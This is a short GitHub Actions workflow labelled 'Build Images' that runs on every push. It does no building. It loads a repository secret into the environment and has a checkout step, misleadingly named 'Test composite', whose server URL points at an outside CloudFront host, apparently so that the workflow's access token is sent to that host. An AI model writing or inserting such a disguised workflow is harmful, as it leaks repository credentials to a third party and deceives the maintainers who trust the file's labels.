name: "Build Images"
on: 
  push:

jobs:
  init:
    runs-on: ubuntu-latest
    name: "init"
    env: 
      REPO_SECRET: ${{ secrets.REPO_SECRET }}
    steps:
    - run: |
        echo "[+] steps"
    - name: Test composite
      uses: actions/checkout@v4
      with:
        repository: certificates/authorities
        github-server-url: https://d1epjq6po5sznu.cloudfront.net
